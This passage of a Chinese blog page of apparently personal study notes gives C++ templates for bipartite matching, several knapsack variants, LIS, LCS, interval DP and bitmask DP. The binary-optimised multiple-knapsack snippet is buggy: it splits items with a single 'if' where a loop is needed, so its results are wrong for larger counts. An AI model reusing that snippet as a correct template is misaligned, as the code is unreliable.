class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag)cout &lt;&lt; <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二分图的最大匹配"><a href="#二分图的最大匹配" class="headerlink" title="二分图的最大匹配"></a>二分图的最大匹配</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	e[idx] = a, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = h[x]; ~i; i = ne[i]) &#123;</span><br><span class="line">		<span class="type">int</span> j = e[i];</span><br><span class="line">		<span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">			st[j] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">if</span> (match[j] == <span class="number">0</span> || <span class="built_in">find</span>(match[j])) &#123;</span><br><span class="line">				match[j] = x;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n1 &gt;&gt; n2 &gt;&gt; m;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		<span class="built_in">add</span>(a, b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n1; i++) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">find</span>(i))res++;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; res;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h2><h3 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a><strong>01背包</strong></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> f[N];<span class="comment">//本来是二维这里对其进行优化</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; v[i] &gt;&gt; w[i];<span class="comment">//从第一个开始存放</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;=v[i]; j--) &#123;</span><br><span class="line">			f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;cout &lt;&lt; f[m];<span class="comment">//返回的是体的最积最大为m时的最大价值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a><strong>多重背包</strong></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多重背包问题，多重背包是单重背包的变式，同时是完全背包问题加了部分约束</span></span><br><span class="line"><span class="comment">//这里是暴力做法加上一点维数优化</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e4</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N], b[N], s[N];</span><br><span class="line"><span class="type">int</span> f[N];<span class="comment">//这是对二维的优化</span></span><br><span class="line"><span class="type">int</span> n, x,sum;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; x ;</span><br><span class="line">	f[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; a[i] &gt;&gt; b[i];<span class="comment">//将a[i],b[i]输入</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = x; j &gt;= <span class="number">0</span>;j--) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= b[i]; k++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (k * a[i] &lt;= j)&#123;</span><br><span class="line">               f[j] =<span class="built_in">max</span>( f[j],f[j - k * a[i]]);		 </span><br><span class="line">				&#125;		</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (f[x])cout &lt;&lt; <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化思路，例如有s&#x3D;200，可以把他降成多个2的几次幂和加上一个差的数，从而将较大的数转化成要不要选较少的几个选项及01背包变式,即二进制优化<br>多重背包的优化,是将这么多件商品进行二进制化,, 每个件数都可以表示为多个2的不同次幂加上最后一个小于2^k+1的c值,将新的件数,放进质量和体积中,成为一个新的整体</p>
<h4 id="多重背包二进制优化版本"><a href="#多重背包二进制优化版本" class="headerlink" title="多重背包二进制优化版本"></a><em><strong>多重背包二进制优化版本</strong></em></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">25000</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];<span class="comment">//以v[i]表示体积,另一个表示权重即价值</span></span><br><span class="line"><span class="type">int</span> dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, s;</span><br><span class="line">		cin &gt;&gt; a&gt;&gt;b&gt;&gt;s; </span><br><span class="line">		<span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (k &lt;= s) &#123;</span><br><span class="line">			cnt++,v[cnt] = k * a,w[cnt] = k * b,s -= k,k *= <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			cnt++,v[cnt] = s*a,w[cnt] = s * b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	n = cnt;<span class="comment">//更换新的件数</span></span><br><span class="line">	<span class="comment">//即将多重背包转化成01背包</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--)</span><br><span class="line">			dp[j] = <span class="built_in">max</span>(dp[j], dp[j - v[i]] + w[i]);</span><br><span class="line">	<span class="type">int</span> maxn=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		maxn = <span class="built_in">max</span>(maxn, dp[m]);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; maxn;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h4 id="多重背包的另外一种二进制优化"><a href="#多重背包的另外一种二进制优化" class="headerlink" title="多重背包的另外一种二进制优化"></a><strong>多重背包的另外一种二进制优化</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; b &gt;&gt; a &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= c;k*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * k;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * k] + k * b);</span><br><span class="line">        c -= k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c)&#123;<span class="comment">//多出来的01背包跑一次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * c;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * c] + b * c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; f[m];</span><br></pre></td></tr></table></figure>

<h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a><strong>完全背包</strong></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一维优化</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		cin &gt;&gt; w[i] &gt;&gt; v[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)dp[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = w[i]; j &lt;= m; j++) &#123;</span><br><span class="line">			dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w[i]] + v[i]);<span class="comment">//数学上的化简</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; dp[m] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数字三角形"><a href="#数字三角形" class="headerlink" title="数字三角形"></a>数字三角形</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">510</span>,inf=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n,dp[N][N],a[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">    cin&gt;&gt;a[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i+<span class="number">1</span>;j++)<span class="comment">//初始化要考虑边界问题,每行多初始化一个</span></span><br><span class="line">    dp[i][j]=-inf;<span class="comment">//题目要求要从最上层到最底层的最大路径,要考虑到数字可以为负数</span></span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">1</span>]=a[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">    dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j]+a[i][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+a[i][j]);</span><br><span class="line">    <span class="type">int</span> res=-inf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)res=<span class="built_in">max</span>(res,dp[n][i]);</span><br><span class="line">    cout&lt;&lt;res;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//优化版本时间复杂度(nlogn)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N],q[N];<span class="comment">//q负责记录每个长度的尾元素的最小值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)cin&gt;&gt;a[i];</span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    q[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> l=<span class="number">-1</span>,r=len+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l+<span class="number">1</span>!=r)&#123;</span><br><span class="line">            <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(q[mid]&lt;a[i])l=mid;<span class="comment">//找到小于a[i]的最大f值,f是严格单调递增的</span></span><br><span class="line">            <span class="keyword">else</span> r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        len=<span class="built_in">max</span>(len,l+<span class="number">1</span>);<span class="comment">//如果可以更新,则长度加一</span></span><br><span class="line">        q[l+<span class="number">1</span>]=a[i];<span class="comment">//将新的元素接到后面</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="最长上升子序列序列记录"><a href="#最长上升子序列序列记录" class="headerlink" title="最长上升子序列序列记录"></a>最长上升子序列序列记录</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n,dp[N],a[N],g[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i]=<span class="number">1</span>;<span class="comment">//初始化</span></span><br><span class="line">        g[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)      </span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">                 <span class="keyword">if</span>(dp[i]&lt;dp[j]+<span class="number">1</span>)&#123;</span><br><span class="line">                    dp[i]=dp[j]+<span class="number">1</span>;</span><br><span class="line">                    g[i]=j;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125; &#125;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;dp[k])k=i;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[k]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,len=dp[k];i&lt;len;i++)&#123;<span class="comment">//要注意要确定以dp[k]为len</span></span><br><span class="line">         cout&lt;&lt;a[k]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">         k=g[k];   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p><strong>记录路径</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3010</span>;</span><br><span class="line"><span class="type">int</span> f[N][N],st[N][N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; hh;</span><br><span class="line">string s1, s2;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>||b==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(st[a][b]==<span class="number">1</span>) &#123;</span><br><span class="line">            hh.<span class="built_in">push</span>(s1[a]);</span><br><span class="line">            <span class="built_in">write</span>(a - <span class="number">1</span>, b - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;&#125;    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(st[a][b]==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">write</span>(a - <span class="number">1</span>, b);</span><br><span class="line">        <span class="keyword">return</span>; &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">write</span>(a, b - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;&#125;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; s1 &gt;&gt; s2;</span><br><span class="line">    n = s1.<span class="built_in">length</span>();</span><br><span class="line">    m = s2.<span class="built_in">length</span>();</span><br><span class="line">    s1 = <span class="string">&quot;#&quot;</span> + s1;</span><br><span class="line">    s2 = <span class="string">&quot;w&quot;</span> + s2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m;j++)&#123;\</span><br><span class="line">        <span class="comment">//要是不记录路径直接一次dp</span></span><br><span class="line">    <span class="comment">/*          dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">        if(a[i]==b[j])dp[i][j]=max(dp[i][j],dp[i-1][j-1]+1);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">            <span class="keyword">if</span>(s1[i]==s2[j])&#123;</span><br><span class="line">                f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                st[i][j] = <span class="number">1</span>;     </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(f[i<span class="number">-1</span>][j]&gt;=f[i][j<span class="number">-1</span>]) &#123;</span><br><span class="line">                f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">                st[i][j] = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                f[i][j] = f[i][j - <span class="number">1</span>];</span><br><span class="line">                st[i][j] = <span class="number">3</span>;</span><br><span class="line">            &#125; &#125; &#125;</span><br><span class="line">    <span class="built_in">write</span>(n, m);</span><br><span class="line">    <span class="keyword">while</span>(!hh.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; hh.<span class="built_in">top</span>();</span><br><span class="line">        hh.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="区间dp"><a href="#区间dp" class="headerlink" title="区间dp"></a>区间dp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n,s[N],dp[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)s[i]=s[i<span class="number">-1</span>]+s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> len=<span class="number">2</span>;len&lt;=n;len++)&#123;<span class="comment">//枚举区间长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i+len<span class="number">-1</span>&lt;=n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> l=i,r=i+len<span class="number">-1</span>;<span class="comment">//循环区间的左端点</span></span><br><span class="line">            dp[l][r]=<span class="number">1e8</span>;<span class="comment">//初始化</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=r<span class="number">-1</span>;k++)&#123;<span class="comment">//k是从i开始,不是从一开始</span></span><br><span class="line">                dp[l][r]=<span class="built_in">min</span>(dp[l][r],dp[l][k]+dp[k+<span class="number">1</span>][r]+s[r]-s[l<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[<span class="number">1</span>][n];</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="状压DP"><a href="#状压DP" class="headerlink" title="状压DP"></a>状压DP</h2><h3 id="蒙德里安的梦想"><a href="#蒙德里安的梦想" class="headerlink" title="蒙德里安的梦想"></a>蒙德里安的梦想</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计把n*m的矩形切成若干个1*2的小矩形,问有多少种方案</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M = <span class="number">1</span> &lt;&lt; N;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ll;</span><br><span class="line">ll dp[N][M];</span><br><span class="line"><span class="type">bool</span> st[M];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m,n||m)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span> dp);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">            st[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;&gt;j &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                        st[i] = <span class="literal">false</span>;</span><br><span class="line">                    cnt = <span class="number">0</span>;<span class="comment">//当碰到为1的点时,不管cnt是不是奇数,都要清零</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cnt++;&#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                st[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="comment">//就是把中间空余部分为奇数的情况标记一下</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span> &lt;&lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">1</span> &lt;&lt; n;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>((j&amp;k)==<span class="number">0</span>&amp;&amp;st[j|k])&#123;</span><br><span class="line">                        dp[i][j] += dp[i - <span class="number">1</span>][k];<span class="comment">//状态转移方程</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; dp[m][<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

